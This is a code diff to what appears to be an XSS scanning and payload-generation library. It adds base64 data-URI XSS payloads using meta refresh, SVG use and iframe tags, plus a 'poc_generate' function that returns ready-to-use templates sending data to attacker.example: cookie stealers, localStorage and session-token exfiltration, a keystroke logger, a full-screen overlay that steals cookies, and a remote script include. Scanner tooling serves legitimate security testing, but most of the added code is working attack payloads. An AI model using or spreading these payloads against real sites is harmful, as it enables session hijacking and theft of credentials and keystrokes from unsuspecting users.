@@ -28,11 +28,13 @@ from commonhuman_payloads.encoders import (
   EVASION_COMMENT_BREAK,
   EVASION_CSS_EXPR,
   EVASION_DOUBLE_ENCODE,
+  EVASION_FROMCHARCODE,
   EVASION_HTML_ENCODE,
   EVASION_NEWLINE,
   EVASION_NONE,
   EVASION_NULL_BYTE,
   EVASION_UNICODE,
+  EVASION_UNESCAPE,
 )
 from commonhuman_payloads.xss import (
   HTML_BODY, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED, ATTR_NAME,
@@ -46,7 +48,7 @@ from commonhuman_payloads.xss import (
   WAF_BYPASS_GLOBAL, WAF_BYPASS_DOUBLE_ENCODE, PROTOTYPE_POLLUTION,
   CLASSIC_LEGACY, ENCODING, CONTENT_TYPE, MODERN_BROWSER, STORED_XSS,
   UNICODE_CASE_BYPASS, UNICODE_LINE_SEP, DOM_CLOBBERING, REPLACE_PATTERN,
-  RADIX_OBFUSCATION, UNICODE_URL, SANITIZER_BYPASS, CSP_INJECTION,
+  RADIX_OBFUSCATION, UNICODE_URL, SANITIZER_BYPASS, CSP_INJECTION, DATA_URI,
 )
 
 def _fmt(template: str, marker: str) -> str:
@@ -70,8 +72,13 @@ def make_confirm_marker() -> str:
 # ---------------------------------------------------------------------------
 # Context → payload list map
 # ---------------------------------------------------------------------------
+
+# DATA_URI entries that use sentinels encode the marker in base64, so the marker
+# won't appear literally in the rendered payload.
+_DATA_URI_PLAIN = [p for p in DATA_URI if not p.startswith("__B64_")]
+
 _CONTEXT_MAP = {
-  ReflectionContext.HTML_BODY:            HTML_BODY + UNICODE_CASE_BYPASS + DOM_CLOBBERING + RADIX_OBFUSCATION + SANITIZER_BYPASS,
+  ReflectionContext.HTML_BODY:            HTML_BODY + _DATA_URI_PLAIN + UNICODE_CASE_BYPASS + DOM_CLOBBERING + RADIX_OBFUSCATION + SANITIZER_BYPASS,
   ReflectionContext.ATTR_DOUBLE:          ATTR_DOUBLE,
   ReflectionContext.ATTR_SINGLE:          ATTR_SINGLE,
   ReflectionContext.ATTR_UNQUOTED:        ATTR_UNQUOTED,
@@ -91,7 +98,7 @@ _CONTEXT_MAP = {
   ReflectionContext.TITLE:                TITLE,
   ReflectionContext.IFRAME_SRCDOC:        IFRAME_SRCDOC,
   ReflectionContext.NOSCRIPT:             NOSCRIPT,
-  ReflectionContext.OBJECT_DATA:          OBJECT_DATA,
+  ReflectionContext.OBJECT_DATA:          OBJECT_DATA + _DATA_URI_PLAIN,
   ReflectionContext.TAG_NAME:             TAG_NAME,
   ReflectionContext.COMMENT:              COMMENT,
   ReflectionContext.ANGULAR_TEMPLATE:     ANGULAR_TEMPLATE,
@@ -132,15 +139,34 @@ def generate(
 
   payloads = [_fmt(p, marker) for p in base]
 
-  # Resolve base64 data-URL sentinel: "__B64_DATA_URL__:<marker>" →
-  # <object data='data:text/html;base64,...'> with the marker embedded inside.
+  # Resolve base64 data-URL sentinels emitted by DATA_URI / OBJECT_DATA payloads.
   resolved = []
   for p in payloads:
     if p.startswith("__B64_DATA_URL__:"):
       inner_marker = p[len("__B64_DATA_URL__:"):]
-      inner_html = f"<script>alert('{inner_marker}')</script>"
-      encoded = base64.b64encode(inner_html.encode()).decode()
+      inner_html   = f"<script>alert('{inner_marker}')</script>"
+      encoded      = base64.b64encode(inner_html.encode()).decode()
       resolved.append(f"data:text/html;base64,{encoded}")
+    elif p.startswith("__B64_SCRIPT__:"):
+      # Produces full <meta> refresh tag with base64 data URI
+      inner_marker = p[len("__B64_SCRIPT__:"):]
+      inner_html   = f"<script>alert('{inner_marker}')</script>"
+      encoded      = base64.b64encode(inner_html.encode()).decode()
+      resolved.append(f'<meta http-equiv=refresh content="0;url=data:text/html;base64,{encoded}">')
+    elif p.startswith("__B64_SVG_USE__:"):
+      # Produces full <svg><use> tag with base64 SVG data URI
+      inner_marker = p[len("__B64_SVG_USE__:"):]
+      svg = (
+        f"<svg id='x' xmlns='http://www.w3.org/2000/svg'>"
+        f"<script>alert('{inner_marker}')</script></svg>"
+      )
+      encoded = base64.b64encode(svg.encode()).decode()
+      resolved.append(f'<svg><use href="data:image/svg+xml;base64,{encoded}"></svg>')
+    elif p.startswith("__B64_HTML_IFRAME__:"):
+      inner_marker = p[len("__B64_HTML_IFRAME__:"):]
+      inner_html   = f"<script>alert('{inner_marker}')</script>"
+      encoded      = base64.b64encode(inner_html.encode()).decode()
+      resolved.append(f"<iframe src=\"data:text/html;base64,{encoded}\">")
     else:
       resolved.append(p)
   payloads = resolved
@@ -363,6 +389,69 @@ def prototype_pollution_params(marker: Optional[str] = None) -> List[tuple[str, 
 # ---------------------------------------------------------------------------
 # Evasion transforms
 # ---------------------------------------------------------------------------
+
+def data_uri_payloads(marker: Optional[str] = None) -> List[str]:
+  """Return data: URI injection payloads (plain and base64-encoded variants)."""
+  if marker is None:
+    marker = make_confirm_marker()
+  raw = [_fmt(p, marker) for p in DATA_URI]
+  # Resolve sentinels
+  resolved = []
+  for p in raw:
+    if p.startswith("__B64_SCRIPT__:"):
+      m2 = p[len("__B64_SCRIPT__:"):]
+      inner = f"<script>alert('{m2}')</script>"
+      encoded = base64.b64encode(inner.encode()).decode()
+      resolved.append(f'<meta http-equiv=refresh content="0;url=data:text/html;base64,{encoded}">')
+    elif p.startswith("__B64_SVG_USE__:"):
+      m2 = p[len("__B64_SVG_USE__:"):]
+      svg = f"<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('{m2}')</script></svg>"
+      encoded = base64.b64encode(svg.encode()).decode()
+      resolved.append(f'<svg><use href="data:image/svg+xml;base64,{encoded}"></svg>')
+    elif p.startswith("__B64_HTML_IFRAME__:"):
+      m2 = p[len("__B64_HTML_IFRAME__:"):]
+      inner = f"<script>alert('{m2}')</script>"
+      resolved.append(f"<iframe src=\"data:text/html;base64,{base64.b64encode(inner.encode()).decode()}\">")
+    else:
+      resolved.append(p)
+  return resolved
+
+
+def poc_generate(oob_url: str = "https://attacker.example") -> dict:
+  """Return a dict of ready-to-use PoC payload templates.
+
+  Callers substitute the confirmed payload's parameter+URL to build a real PoC.
+  ``oob_url`` is the attacker-controlled OOB collection server.
+  """
+  oob = oob_url.rstrip("/")
+  return {
+    "cookie_stealer": (
+      f"<img src=x onerror=\"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\">"
+    ),
+    "cookie_stealer_onmousemove": (
+      f"<body onmousemove=\"this.onmousemove=null;"
+      f"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\">"
+    ),
+    "localstorage_exfil": (
+      f"<img src=x onerror=\"fetch('{oob}/?ls='+btoa(JSON.stringify(localStorage)))\">"
+    ),
+    "session_token_exfil": (
+      f"<script>fetch('/api/user').then(r=>r.json())"
+      f".then(d=>fetch('{oob}/?d='+btoa(JSON.stringify(d)))).catch(()=>{{}})</script>"
+    ),
+    "iframe_keylogger": (
+      f"<script>document.onkeypress=e=>fetch('{oob}/?k='+e.key)</script>"
+    ),
+    "stealth_onmousemove": (
+      f"<div style='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999'"
+      f" onmousemove=\"this.onmousemove=null;"
+      f"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\"></div>"
+    ),
+    "remote_script": (
+      f"<script src='{oob}/payload.js'></script>"
+    ),
+  }
+
 
 def _apply_evasion(payload: str, evasion: str) -> List[str]:
   """Return [original, transformed] — always include the original."""
